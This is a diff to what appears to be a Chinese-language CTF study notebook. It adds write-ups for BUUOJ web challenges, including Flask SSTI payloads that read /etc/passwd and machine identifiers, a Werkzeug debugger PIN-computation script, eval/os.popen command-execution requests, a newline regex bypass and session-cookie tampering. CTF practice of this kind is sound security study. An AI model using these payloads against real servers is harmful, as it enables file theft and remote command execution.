@@ -23,6 +23,7 @@ tags:
 5. [Playfair](https://rumkin.com/tools/cipher/playfair/)
 6. [MD5 collisions](https://github.com/corkami/collisions?spm=5176.28103460.0.0.72ab6308WVILLI)
 7. [Unicode](https://www.compart.com/en/unicode/)
+8. [jsfuck](http://www.hiencode.com/jsfuck.html) jsfuck加解密
 
 # Linux(Ubuntu)下下载的文件乱码问题（Crypto中特别多）
 1. 查看文件编码
@@ -1838,7 +1839,188 @@ Warning: Cannot modify header information - headers already sent by (output star
 
 
 ### [FlaskApp](https://buuoj.cn/challenges#[GYCTF2020]FlaskApp)
-base64缟解码，但发现解码system/flag/Base64-encode的编码返回"no no no !!"，可能过滤了部分关键词
+base64编解码，但发现解码system/flag/Base64-encode的编码返回"no no no !!"，可能过滤了部分关键词
 ```
 php://filter/read=convert.Base64-encode/resource=decode
 ```
+flask模板注入，在解密中随便输入内容使其报错
+```sh
+Traceback (most recent call last)
+File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 2463, in __call__
+return self.wsgi_app(environ, start_response)
+File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 2449, in wsgi_app
+Open an interactive python shell in this frameresponse = self.handle_exception(e)
+```
+获取PIN码需要以下 6 个特定信息: 
+* username -> /etc/passwd
+* modname -> flask.app
+* appname -> Flask
+* moddir -> absolutepath(app.py)
+* uuidnode -> /sys/class/net/eth0/address
+* machine_id -> /etc/machine-id, /proc/sys/kernel/random/boot_id, (docker+ /proc/self/cgroup)
+```sh
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+
+结果 ： root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh
+
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/sys/class/net/eth0/address').read()}}
+
+86:db:b9:5e:97:1d
+
+>>> print(int('86dbb95e971d', 16))
+148278265943837
+
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/machine-id').read()}}
+
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/proc/self/cgroup').read()}}
+
+结果 ： 13:blkio:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 12:rdma:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 11:perf_event:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 10:devices:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 9:cpu,cpuacct:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 8:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 7:memory:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 6:pids:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 5:misc:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 4:net_cls,net_prio:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 3:cpuset:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 2:freezer:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 1:name=systemd:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope 0::/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod390d529b_cb17_47c5_8f62_076e26df699c.slice/docker-e881e5ed6e41369ac5d42eef0ab6cf0e1955902815472cb4a7c55f4dfe66a967.scope
+```
+
+计算PIN码
+
+```py
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    'flaskweb',
+    'flask.app',
+    'Flask',
+    '/usr/local/lib/python3.7/site-packages/flask/app.py',
+]
+
+private_bits = [
+    '148278265943837',
+    '1408f836b0ca514d796cbf8960e45fa1'
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+```
+
+在报错页面中打开python shell
+```py
+import os
+>>> os.popen('ls /').read()
+'app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n'  
+>>> os.popen('cat /this_is_the_flag.txt').read()
+'flag{71141aec-2aa4-417a-b54b-3b1d2922008e}\n'
+```
+
+### [RCEService](https://buuoj.cn/challenges#[FBCTF2019]RCEService)
+换行%0a绕过正则
+```
+GET /?cmd={%0a"cmd":"ls%20/"%0a} HTTP/1.1
+
+Attempting to run command:<br/>bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+<br/>
+
+GET /?cmd={%0a"cmd":"/bin/cat%20/home/rceservice/flag"%0a} HTTP/1.1
+```
+
+### [Cookie Store](https://buuoj.cn/challenges#[watevrCTF-2019]Cookie%20Store)
+单击buy后会有一个redirect，查看两次发送的包中Cookie，可以判断是base64编码
+```sh
+POST /buy HTTP/1.1
+Host: 8f973c14-1f75-4e69-ad40-3d2cd139f4d8.node5.buuoj.cn
+Content-Length: 4
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://8f973c14-1f75-4e69-ad40-3d2cd139f4d8.node5.buuoj.cn
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://8f973c14-1f75-4e69-ad40-3d2cd139f4d8.node5.buuoj.cn/
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJtb25leSI6IDM4LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSIsICJZdW1teSBwZXBwYXJrYWthIl19
+Connection: keep-alive
+
+id=0
+```
+
+```sh
+GET / HTTP/1.1
+Host: 8f973c14-1f75-4e69-ad40-3d2cd139f4d8.node5.buuoj.cn
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://8f973c14-1f75-4e69-ad40-3d2cd139f4d8.node5.buuoj.cn/
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJtb25leSI6IDM3LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSIsICJZdW1teSBwZXBwYXJrYWthIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSJdfQ==
+Connection: keep-alive
+
+
+```
+其中Cookie使用base64解码可得
+```
+{"money": 38, "history": ["Yummy chocolate chip cookie", "Yummy chocolate chip cookie", "Yummy pepparkaka"]}
+```
+buy 100 使用BurpSuite的Proxy截包修改"money"大于100后再发送，截取第二次发送的Cookie解码可得flag
+
+### [FlaskLight](https://buuoj.cn/challenges#[CSCCTF%202019%20Qual]FlaskLight)
+```sh
+GET /?search={{2*3}} HTTP/1.1
+```
+确定存在SSTI
+```sh
+GET /?search={{().__class__.__bases__[0].__subclasses__()}} HTTP/1.1
+```
+一堆type列表中找到<class 'warnings.catch_warnings'>等执行命令
+```sh
+GET /?search={{().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}} HTTP/1.1
+
+GET /?search={{().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls%20/flasklight').read()")}} HTTP/1.1
+
+app.py
+coomme_geeeett_youur_flek
+
+GET /?search={{().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat%20/flasklight/coomme_geeeett_youur_flek').read()")}} HTTP/1.1
+```
+
+### [CV Maker](https://buuoj.cn/challenges#[WUSTCTF2020]CV%20Maker)
